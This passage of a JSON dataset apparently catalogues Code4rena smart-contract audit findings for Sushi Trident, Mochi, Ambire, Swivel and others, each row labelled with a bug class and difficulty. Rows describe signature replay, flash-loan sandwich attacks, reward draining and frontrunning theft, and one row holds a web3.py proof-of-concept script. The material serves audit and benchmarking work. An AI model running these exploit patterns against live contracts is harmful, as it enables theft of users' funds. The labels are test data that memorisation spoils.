null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"ConcentratedLiquidityPool.sol#L263L267Change:\",\n      \"unchecked\\n{\\nreserve0\\n-=\\nuint128\\n(\\namount0fees\\n);\\nreserve1\\n-=\\nuint128\\n(\\namount1fees\\n);\\n}\",\n      \"to:\",\n      \"unchecked\\n{\\nreserve0\\n-=\\nuint128\\n(\\namount0\\n);\\nreserve1\\n-=\\nuint128\\n(\\namount1\\n);\\n}\",\n      \"sarangparikh22 (Sushi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 63,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"ConcentratedLiquidityPool: incorrect feeGrowthGlobal accounting when crossing ticks\\\"\",\n    \"line\": \"ConcentratedLiquidityPool[305,511], Ticks[23,32]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident-2#h-11-concentratedliquiditypool-incorrect-feegrowthglobal-accounting-when-crossing-ticks\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hickuphh3\",\n      \"Swap fees are taken from the output. Hence, if swapping token0 for token1 (zeroForOneis true), then fees are taken in token1. We see this to be the case in the initialization offeeGrowthGlobalin the swap cache\",\n      \"feeGrowthGlobal = zeroForOne ? feeGrowthGlobal1 : feeGrowthGlobal0;\",\n      \"and in_updateFees().\",\n      \"However, looking atTicks.cross(), the logic is the reverse, which causes wrong fee accounting.\",\n      \"Switch the0and1inTicks.cross().\",\n      \"sarangparikh22 (Sushi) confirmed\"\n    ],\n    \"code_blocks\": [\n      \"if\\n(\\nzeroForOne\\n) {\\n...\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside0\\n=\\nfeeGrowthGlobal\\n-\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside0\\n;\\n}\\nelse\\n{\\n...\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside1\\n=\\nfeeGrowthGlobal\\n-\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside1\\n;\\n}\",\n      \"if\\n(\\nzeroForOne\\n) {\\n...\\n// `feeGrowthGlobal` = feeGrowthGlobal1\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside1\\n=\\nfeeGrowthGlobal\\n-\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside1\\n;\\n}\\nelse\\n{\\n...\\n// feeGrowthGlobal = feeGrowthGlobal0\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside0\\n=\\nfeeGrowthGlobal\\n-\\nticks\\n[\\nnextTickToCross\\n].\\nfeeGrowthOutside0\\n;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 64,\n    \"bug_id\": \" H-12\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"ConcentratedLiquidityPool: secondsPerLiquidity should be modified whenever pool liquidity changes\\\"\",\n    \"line\": \"ConcentratedLiquidityPool[495,552],\",\n    \"url\": \" https://code4rena.com/reports/2021-09-sushitrident-2#h-12-concentratedliquiditypool-secondsperliquidity-should-be-modified-whenever-pool-liquidity-changes\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hickuphh3\",\n      \"secondsPerLiquidityis updated as such:secondsPerLiquidity += uint160((diff << 128) / liquidity);wherediff = timestamp - uint256(lastObservation). Hence, whenever liquidity changes,secondsPerLiquidityshould be updated prior to the change.\",\n      \"In particular, this affects themint()andburn()functions, in the case where liquidity changes whenlowerTick <= currentTick < upperTick.\",\n      \"In fact, the latestsecondsPerLiquidityvalue should be calculated and used inTicks.insert(). For comparison, notice how UniswapV3 fetches the latest value by callingobservations.observeSingle()in its_updatePosition()function.\",\n      \"ThesecondsPerLiquidityincrement logic should be applied prior to liquidity addition inmint()and removal inburn().\",\n      \"sarangparikh22 (Sushi) disputed:\",\n      \"alcueca (judge) commented:\",\n      \"sarangparikh22 (Sushi) confirmed:\"\n    ],\n    \"code_blocks\": [\n      \"// insert logic before these lines in mint()\\nunchecked\\n{\\nif\\n(\\npriceLower\\n<\\ncurrentPrice\\n&&\\ncurrentPrice\\n<\\npriceUpper\\n)\\nliquidity\\n+=\\nuint128\\n(\\n_liquidity\\n);\\n}\\nnearestTick\\n=\\nTicks\\n.\\ninsert\\n(\\nticks\\n,\\nfeeGrowthGlobal0\\n,\\nfeeGrowthGlobal1\\n,\\nsecondsPerLiquidity\\n,\\n// should calculate and use latest secondsPerLiquidity value\\n...\\n);\\n// insert logic before before these lines in burn()\\nunchecked\\n{\\nif\\n(\\npriceLower\\n<\\ncurrentPrice\\n&&\\ncurrentPrice\\n<\\npriceUpper\\n)\\nliquidity\\n-=\\namount\\n;\\n}\"\n    ],\n    \"quotes\": [\n      \"The secondsPerLiquidity is same, changing the order of that will not affect anything, since it is not getting calculated at the mint or burn function.\",\n      \"@sarangparikh22 (Sushi), could you please elaborate on why this isn‚Äôt an issue?\",\n      \"@alcueca (judge) my apologies, this is an issue. I could confirm this.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 65,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Basket.sol#auctionBurn() A failed auction will freeze part of the funds\\\"\",\n    \"line\": \"Basket[102]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-defiprotocol#h-02-basketsolauctionburn-a-failed-auction-will-freeze-part-of-the-funds\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Basket.sol#L102-L108\",\n      \"Given theauctionBurn()function will_burn()the auction bond without updating theibRatio. Once the bond of a failed auction is burned, the proportional underlying tokens won‚Äôt be able to be withdrawn, in other words, being frozen in the contract.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"With the configuration of:\",\n      \"basket.ibRatio = 1e18\\nfactory.bondPercentDiv = 400\\nbasket.totalSupply = 400\\nbasket.tokens = [BTC, ETH]\\nbasket.weights = [1, 1]\",\n      \"Create an auction;Bond with 1 BASKET TOKEN;Wait for 24 hrs and callauctionBurn();\",\n      \"basket.ibRatioremains to be 1e18; basket.totalSupply = 399.\",\n      \"Burn 1 BASKET TOKEN will only get back 1 BTC and 1 ETH, which means, there are 1 BTC and 1 ETH frozen in the contract.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Change to:\",\n      \"function\\nauctionBurn\\n(\\nuint256\\namount\\n)\\nonlyAuction\\nexternal\\noverride\\n{\\nhandleFees\\n();\\nuint256\\nstartSupply\\n=\\ntotalSupply\\n();\\n_burn\\n(\\nmsg\\n.\\nsender\\n,\\namount\\n);\\nuint256\\nnewIbRatio\\n=\\nibRatio\\n*\\nstartSupply\\n/ (\\nstartSupply\\n-\\namount\\n);\\nibRatio\\n=\\nnewIbRatio\\n;\\nemit\\nNewIBRatio\\n(\\nnewIbRatio\\n);\\nemit\\nBurned\\n(\\nmsg\\n.\\nsender\\n,\\namount\\n);\\n}\",\n      \"frank-beard (Kuiper) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has identified a way for funds to be stuck without a way to recoup them, this is becauseibRatiois not updated, whiletotalSupplyis.Because this is a specific accounting error, which is effectively a bug in the logic of the protocol, and funds can be irrevocably lost, this is a high severity finding\"\n    ]\n  },\n  {\n    \"row_number\": 66,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S2-3\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Signature replay attacks for different identities (nonce on wrong party)\\\"\",\n    \"line\": \"QuickAccManager[37]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-ambire#h-03-signature-replay-attacks-for-different-identities-nonce-on-wrong-party\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by WatchPug\",\n      \"A singleQuickAccountcan serve as the ‚Äúprivilege‚Äù for multiple identities, see the comment inQuickAccManager.sol:\",\n      \"If there exist two different identities thatboth share the same QuickAccount(identity1.privileges(address(this)) == identity2.privileges(address(this)) == accHash) the following attack is possible inQuickAccManager.send:\",\n      \"Upon observing a validsendon the first identity, the same transactions can be replayed on the second identity by an attacker callingsendwith the same arguments and just changing theidentityto the second identity.\",\n      \"This is because theidentityis not part of thehash. Including thenonce ofthe identity in the hash is not enough.\",\n      \"Two fresh identities will both take on nonces on zero and lead to the same hash.\",\n      \"Transactions on one identity can be replayed on another one if it uses the sameQuickAccount.\\nFor example, a transaction paying a contractor can be replayed by the contract on the second identity earning the payment twice.\",\n      \"This issue of using the wrong nonce (on theidentitywhich means the nonces repeat per identity) and not includingidentityaddress leads to other attacks throughout theQuickAccManager:\",\n      \"cancel: attacker can use the same signature to cancel the same transactions on the second identity\",\n      \"execScheduled: can frontrun this call and execute it on the second identity instead. This will make the original transaction fail asscheduled[hash]is deleted.\",\n      \"sendTransfer: same transfers can be replayed on second identity\",\n      \"sendTxns: same transactions can be replayed on second identity\",\n      \"Ivshti (Ambire) confirmed:\",\n      \"Ivshti (Ambire) patched:\",\n      \"GalloDaSballo (judge) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"NOTE: a single accHash can control multiple identities, as long as those identities set it‚Äôs hash in privileges[address(this)]. this is by design\",\n      \"duplicate of #24, but it‚Äôs better documented\",\n      \"mitigation step 1 is not going to be done, since there‚Äôs already plenty of upper level code relying on indexing by identity, and it doesn‚Äôt really hurt if the replay attack is mitigatedplus, it makes it harder to look up the nonce value, as we have to compute the accHash in the client-side codethe replay attack has been fixed herehttps://github.com/AmbireTech/adex-protocol-eth/commit/f70ca38f368da30c9881d1ee5554fd0161c94486\",\n      \"The warden identified a Signature Replay attack, allowing to re-use a signature throughout the system.Requiring the identity to be part of the signatures mitigates the vulnerabilityThe sponsor has mitigated in a subsequent PR\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Nonces should not be indexed by the identity but by theaccHash. This is because nonces are used to stop replay attacks and thus need to be on thesigner(QuickAccountin this case), not on the target contract to call.Theidentityaddressitself needs to be part ofhashas otherwise thesendcan be frontrun and executed by anyone on the other identity by switching out theidentityparameter.\"\n    ]\n  },\n  {\n    \"row_number\": 67,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Swivel: Taker is charged fees twice in exitVaultFillingVaultInitiate\\\"\",\n    \"line\": \"Swivel[268]\",\n    \"url\": \" https://code4rena.com/reports/2021-09-swivel#h-02-swivel-taker-is-charged-fees-twice-in-exitvaultfillingvaultinitiate\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by itsmeSTYJ, also found by gpersoon.\",\n      \"Taker is charged fees twice inexitVaultFillingVaultInitiate(). Maker is transferring less than premiumFilled to taker and then taker is expected to pay fees i.e. taker‚Äôs net balance is premiumFilled - 2*fee\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"function\\nexitVaultFillingVaultInitiate\\n(Hash.Order\\ncalldata\\no\\n,\\nuint256\\na\\n, Sig.Components\\ncalldata\\nc\\n)\\ninternal\\n{\\nbytes32\\nhash\\n=\\nvalidOrderHash\\n(\\no\\n,\\nc\\n);\\nrequire\\n(\\na\\n<= (\\no\\n.\\nprincipal\\n-\\nfilled\\n[\\nhash\\n]),\\n'taker amount > available volume'\\n);\\nfilled\\n[\\nhash\\n] +=\\na\\n;\\nuint256\\npremiumFilled\\n= (((\\na\\n*\\n1e18\\n) /\\no\\n.\\nprincipal\\n) *\\no\\n.\\npremium\\n) /\\n1e18\\n;\\nuint256\\nfee\\n= ((\\npremiumFilled\\n*\\n1e18\\n) /\\nfenominator\\n[\\n3\\n]) /\\n1e18\\n;\\nErc20\\nuToken\\n=\\nErc20\\n(\\no\\n.\\nunderlying\\n);\\n// transfer premium from maker to sender\\nuToken\\n.\\ntransferFrom\\n(\\no\\n.\\nmaker\\n,\\nmsg\\n.\\nsender\\n,\\npremiumFilled\\n);\\n// transfer fee in underlying to swivel from sender\\nuToken\\n.\\ntransferFrom\\n(\\nmsg\\n.\\nsender\\n,\\naddress\\n(\\nthis\\n),\\nfee\\n);\\n// transfer <a> vault.notional (nTokens) from sender to maker\\nrequire\\n(\\nMarketPlace\\n(\\nmarketPlace\\n).\\np2pVaultExchange\\n(\\no\\n.\\nunderlying\\n,\\no\\n.\\nmaturity\\n,\\nmsg\\n.\\nsender\\n,\\no\\n.\\nmaker\\n,\\na\\n),\\n'vault exchange failed'\\n);\\nemit\\nExit\\n(\\no\\n.\\nkey\\n,\\nhash\\n,\\no\\n.\\nmaker\\n,\\no\\n.\\nvault\\n,\\no\\n.\\nexit\\n,\\nmsg\\n.\\nsender\\n,\\na\\n,\\npremiumFilled\\n);\\n}\",\n      \"JTraversa (Swivel) confirmed\",\n      \"0xean (judge) commented:\",\n      \"Based on3 ‚Äî High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).This is being upgraded to a high risk. The duplicate of it was at that level by the submitting warden and considering that fees are being incorrectly taken from the taker and not the maker, the maker ends up with a higher balance than expected and the taker has no way to recoup these fees (assets are now lost).\",\n      \"JTraversa (Swivel) commented:\",\n      \"Is that how it is interpreted? I‚Äôd assume that high risk would imply a valid attack path that a user could use to drain deposited funds based on that description.I won‚Äôt fight this one obviously, just think there‚Äôs acleardifferentiation between this and the other high risk issue.\"\n    ]\n  },\n  {\n    \"row_number\": 68,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Vault fails to track debt correctly that leads to bad debt\\\"\",\n    \"line\": \"MochiVault[242]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-01-vault-fails-to-track-debt-correctly-that-leads-to-bad-debt\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005, also found by WatchPug\",\n      \"It‚Äôs similar to the issue ‚Äúmisuse amount as increasing debt in the vault contract‚Äù.\\nSimilar issue in a different place that leads to different exploit patterns and severity.\",\n      \"When users borrow usdm from a vault, the debt increases by the amount * 1.005.\",\n      \"However, when the contract records the total debt it uses_amountinstead ofincreasingDebt.\",\n      \"MochiVault.sol L242-L249\",\n      \"The contract‚Äôs debt is inconsistent with the total sum of all users‚Äô debt. The bias increases overtime and would break the vault at the end.\",\n      \"For simplicity, we assume there‚Äôs only one user in the vault.\\nExample:\",\n      \"User deposits 1.2 M worth of BTC and borrows 1M USDM.\",\n      \"The user‚Äôs debt (details[_id].debt) would be 1.005 M as there‚Äôs a .5 percent fee.\",\n      \"The contract‚Äôs debt is 1M.\",\n      \"BTC price decrease by 20 percent\",\n      \"The liquidator tries to liquidate the position.\",\n      \"The liquidator repays 1.005 M and the contract tries to sub the debt by 1.005 M\",\n      \"The transaction is reverted asdetails[_id].debt -= _usdm;would raise exception.\",\n      \"inaccurate accounting would lead to serious issues. I consider this a high-risk issue.\"\n    ],\n    \"code_blocks\": [\n      \"uint256\\nincreasingDebt\\n= (\\n_amount\\n*\\n1005\\n) /\\n1000\\n;\",\n      \"details\\n[\\n_id\\n].\\ndebtIndex\\n=\\n(\\ndetails\\n[\\n_id\\n].\\ndebtIndex\\n* (\\ntotalDebt\\n)) /\\n(\\ndetails\\n[\\n_id\\n].\\ndebt\\n+\\n_amount\\n);\\ndetails\\n[\\n_id\\n].\\ndebt\\n=\\ntotalDebt\\n;\\ndetails\\n[\\n_id\\n].\\nstatus\\n=\\nStatus\\n.\\nActive\\n;\\ndebts\\n+=\\n_amount\\n;\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"This is a web3.py script that a liquidation may fail.\",\n      \"deposit_amount =\\n10\\n**\\n18\\nbig_deposit = deposit_amount *\\n100000\\nminter.functions.mint(user, big_deposit).transact()\\ndai.functions.approve(vault.address, big_deposit + deposit_amount).transact()\\n# create two positions\\nvault.functions.mint(user, zero_address).transact()\\nvault.functions.mint(user, zero_address).transact()\\n# # borrow max amount\\nvault.functions.increase(\\n0\\n, big_deposit, big_deposit, zero_address,\\n''\\n).transact()\\nvault.functions.increase(\\n1\\n, deposit_amount, deposit_amount, zero_address,\\n''\\n).transact()\\nvault_debt = vault.functions.debts().call()\\n# ## This would clear out all debt in vault.\\nrepay_amount = vault_debt +\\n10\\n**\\n18\\nusdm.functions.approve(vault.address, repay_amount).transact()\\nvault.functions.repay(\\n0\\n, repay_amount).transact()\\nprint\\n(\\n'debt left:'\\n, vault.functions.debts().call())\\n# ## All the positions would not be liquidated from now on\\ndai_price = cssr_factory.functions.getPrice(dai.address).call()\\ncssr_factory.functions.setPrice(dai.address, dai_price[\\n0\\n] //\\n10\\n).transact()\\n## this would revert\\nliquidator.functions.triggerLiquidation(dai.address,\\n1\\n).transact()\"\n    ],\n    \"recommended_mitigation\": [\n      \"I believe this is a mistake. Recommend to check the contract to make sureincreasingDebtis used consistently.\"\n    ]\n  },\n  {\n    \"row_number\": 69,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"registerAsset() can overwrite _assetClass value\\\"\",\n    \"line\": \"MochiProfileV0[58,61,105,129,148,176,200,224]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-04-registerasset-can-overwrite-_assetclass-value\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gpersoon, also found by jonah1005 and leastwood\",\n      \"Everyone can call the functionregisterAsset()of MochiProfileV0.sol\\nAssuming the liquidity for the asset is sufficient,registerAsset()will reset the _assetClass of an already registered asset toAssetClass.Sigma.\",\n      \"When the _assetClass is changed toAssetClass.SigmathenliquidationFactor(),riskFactor(),maxCollateralFactor(),liquidationFee()keeperFee()maxFee()will also return a different value.\\nThen the entire vault will behave differently.\\nThe threshold for liquidation will also be different, possibly leading to a liquidation that isn‚Äôt supposed to happen.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Add the following in functionregisterAsset():\",\n      \"require\\n(\\\\\\n_assetClass\\n\\\\[\\\\\\n_asset\\n] ==\\n0\\n,\\n\\\"Already exists\\\"\\n);\",\n      \"ryuheimat (Mochi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 70,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"debts calculation is not accurate\\\"\",\n    \"line\": \"MochiVault[66,79,263],MochiProfileV0[242,258,272]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-05-debts-calculation-is-not-accurate\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gpersoon\",\n      \"The value of the global variabledebtsin the contractMochiVault.solis calculated in an inconsistent way.\",\n      \"In the functionborrow()the variabledebtsis increased with a value excluding the fee.\\nHowever inrepay()andliquidate()it is decreased with the same value asdetails\\\\[\\\\_id].debtis decreased, which is including the fee.\",\n      \"This would mean thatdebtswill end up in a negative value when all debts are repay-ed. Luckily the functionrepay()prevents this from happening.\",\n      \"In the meantime the value ofdebtsisn‚Äôt accurate.\\nThis value is used directly or indirectly in:\",\n      \"utilizationRatio(),stabilityFee()calculateFeeIndex()ofMochiProfileV0.sol\",\n      \"liveDebtIndex(),accrueDebt(),currentDebt()ofMochiVault.sol\",\n      \"This means the entire debt and claimable calculations are slightly off.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"vault/MochiVaultsol\",\n      \"function\\nborrow\\n(..)\\ndetails\\n\\\\[\\\\\\n_id\\n].\\ndebt\\n=\\ntotalDebt\\n;\\n// includes the fee\\ndebts\\n+= \\\\\\n_amount\\n;\\n// excludes the fee\\nfunction\\nrepay\\n(..)\\ndebts\\n-= \\\\\\n_amount\\n;\\\\\\ndetails\\n\\\\[\\\\\\n_id\\n].\\ndebt\\n-= \\\\\\n_amount\\n;\\nfunction\\nliquidate\\n(..)\\ndebts\\n-= \\\\\\n_usdm\\n;\\ndetails\\n\\\\[\\\\\\n_id\\n].\\ndebt\\n-= \\\\\\n_usdm\\n;\",\n      \"seeissue pagefor referenced code.\"\n    ],\n    \"recommended_mitigation\": [\n      \"In functionborrow():\\nreplacedebts += \\\\_amount;withdebts += totalDebt\",\n      \"ryuheimat (Mochi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 71,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Referrer can drain ReferralFeePoolV0\\\"\",\n    \"line\": \"ReferralFeePoolV0[28]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-06-referrer-can-drain-referralfeepoolv0\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gzeon\",\n      \"functionclaimRewardAsMochiinReferralFeePoolV0.soldid not reduce user reward balance, allowing referrer to claim the same reward repeatedly and thus draining the fee pool.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Did not reduce user reward balance at L28-47 inReferralFeePoolV0.sol\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add the following lines\",\n      \"rewards -= reward[msg.sender];\\nreward[msg.sender] = 0;\",\n      \"ryuheimat (Mochi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 72,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Anyone can extend withdraw wait period by depositing zero collateral\\\"\",\n    \"line\": \"MochiVault[125,158]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-08-anyone-can-extend-withdraw-wait-period-by-depositing-zero-collateral\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by harleythedog, also found by WatchPug\",\n      \"InMochiVault.sol, the deposit function allows anyone to deposit collateral into any position. A malicious user can call this function with amount = 0, which would reset the amount of time the owner has to wait before they can withdraw their collateral from their position. This is especially troublesome with longer delays, as a malicious user would only have to spend a little gas to lock out all other users from being able to withdraw from their positions, compromising the functionality of the contract altogether.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"thedepositfunctionhere\",\n      \"Notice that calling this function with amount = 0 is not disallowed. This overwriteslastDeposit\\\\[\\\\_id], extending the wait period before a withdraw is allowed.\"\n    ],\n    \"recommended_mitigation\": [\n      \"I would recommend adding:\",\n      \"require(amount > 0, \\\"zero\\\")\",\n      \"at the start of the function, as depositing zero collateral does not seem to be a necessary use case to support.\",\n      \"It may also be worthwhile to consider only allowing the owner of a position to deposit collateral.\",\n      \"ryuheimat (Mochi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 73,\n    \"bug_id\": \" H-09\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"treasury is vulnerable to sandwich attack\\\"\",\n    \"line\": \"MochiTreasuryV0[73]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-09-treasury-is-vulnerable-to-sandwich-attack\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005\",\n      \"There‚Äôs a permissionless functionveCRVlockinMochiTreasury. Since everyone can trigger this function, the attacker can launch a sandwich attack with flashloan to steal the funds.MochiTreasuryV0.sol#L73-L94\",\n      \"Attackers can possibly steal all the funds in the treasury. I consider this is a high-risk issue.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"MochiTreasuryV0.sol#L73-L94\",\n      \"Here‚Äôs an exploit pattern\",\n      \"Flashloan and buy CRV the uniswap poolTriggerveCRVlock()The treasury buys CRV at a very high price.Sell CRV and pay back the loan.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Recommend to addonlyOwnermodifier.\",\n      \"ryuheimat (Mochi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 74,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S3-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"treasuryShare is Overwritten in FeePoolV0._shareMochi()\\\"\",\n    \"line\": \"FeePoolV0[79,94]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-11-treasuryshare-is-overwritten-in-feepoolv0_sharemochi\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"TheFeePoolV0.solcontract accrues fees upon the liquidation of undercollaterised positions. These fees are split between treasury andvMochicontracts. However, whendistributeMochi()is called to distributemochitokens toveCRVholders, bothmochiShareandtreasuryShareis flushed from the contract when there are stillusdmtokens in the contract.\",\n      \"Manual code review\",\n      \"Discussions with the Mochi team.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Consider the following scenario:\",\n      \"TheFeePoolV0.solcontract contains 100usdmtokens at an exchange rate of 1:1 withmochitokens.updateReserve()is called to set the split ofusdmtokens such thattreasurySharehas claim on 20usdmtokens andmochiSharehas claim on the other 80 tokens.AveCRVholder seeks to increase their earnings by callingdistributeMochi()beforesendToTreasury()has been called.As a result, 80usdmtokens are converted tomochitokens and  locked in a curve rewards pool.Consequently,mochiShareandtreasuryShareis set to0(aka flushed).The same user callsupdateReserve()to split the leftover 20usdmtokens betweentreasuryShareandmochiShare.mochiShareis now set to 16usdmtokens.The above process is repeated to distributemochitokens toveCRVholders again and again.The end result is thatveCRVholders have been able to receive all tokens that were intended to be distributed to the treasury.\",\n      \"FeePoolV0.solL94\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider removing the line inFeePoolV0.sol(mentioned above), wheretreasuryShareis flushed.\",\n      \"ryuheimat (Mochi) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 75,\n    \"bug_id\": \" H-12\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"feePool is vulnerable to sandwich attack.\\\"\",\n    \"line\": \"FeePoolV0[55]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-12-feepool-is-vulnerable-to-sandwich-attack\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005\",\n      \"There‚Äôs a permissionless functiondistributeMochiinFeePoolV0.sol L55-L62. Since everyone can trigger this function, an attacker can launch a sandwich attack with flashloan to steal the funds.\",\n      \"The devs have mentioned this concern in the comment. An attacker can steal the funds with a flash loan attack.\",\n      \"Attackers can steal all the funds in the pool. I consider this is a high-risk issue.\",\n      \"ryuheimat (Mochi) disputed:\",\n      \"ghoul-sol (judge) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"I think this is same case ashttps://github.com/code-423n4/2021-10-mochi-findings/issues/60\",\n      \"The same attack, different part of the code. I‚Äôll keep them both.\"\n    ],\n    \"proof_of_concept\": [\n      \"FeePoolV0.sol#L55-L62\",\n      \"Please refer toyDai Incidentto check the severity of aharvestfunction without slippage control.\",\n      \"Please refer toMushrooms-finance-theftto check how likely this kind of attack might happen.\"\n    ],\n    \"recommended_mitigation\": [\n      \"If the dev wants to make this a permissionless control, the contract should calculate a min return based on TWAP and check the slippage.\"\n    ]\n  },\n  {\n    \"row_number\": 76,\n    \"bug_id\": \" H-13\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Tokens Can Be Stolen By Frontrunning VestedRewardPool.vest() and VestedRewardPool.lock()\\\"\",\n    \"line\": \"VestedRewardPool[36,54]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-mochi#h-13-tokens-can-be-stolen-by-frontrunning-vestedrewardpoolvest-and-vestedrewardpoollock\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"TheVestedRewardPool.solcontract is a public facing contract aimed at vesting tokens for a minimum of 90 days before allowing the recipient to withdraw theirmochi. Thevest()function does not utilisesafeTransferFrom()to ensure that vested tokens are correctly allocated to the recipient. As a result, it is possible to frontrun a call tovest()and effectively steal a recipient‚Äôs vested tokens. The same issue applies to thelock()function.\",\n      \"Manual code review\\nDiscussions with the Mochi team\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Ensure that users understand that this function should not be interacted directly as this could result in lost mochi tokens. Additionally, it might be worthwhile creating a single externally facing function which calls safeTransferFrom(), vest() and lock() in a single transaction.\"\n    ]\n  },\n  {\n    \"row_number\": 77,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"unstake should update exchange rates first\\\"\",\n    \"line\": \"DelegatedStaking[217,226]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-covalent#h-02-unstake-should-update-exchange-rates-first\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"Theunstakefunction does not immediately update the exchange rates. It first computes thevalidatorSharesRemove = tokensToShares(amount, v.exchangeRate)with the old exchange rate.\",\n      \"Only afterwards, it updates the exchange rates (if the validator is not disabled):\",\n      \"More shares for the amount are burned than required and users will lose rewards in the end.\"\n    ],\n    \"code_blocks\": [\n      \"// @audit shares are computed here with old 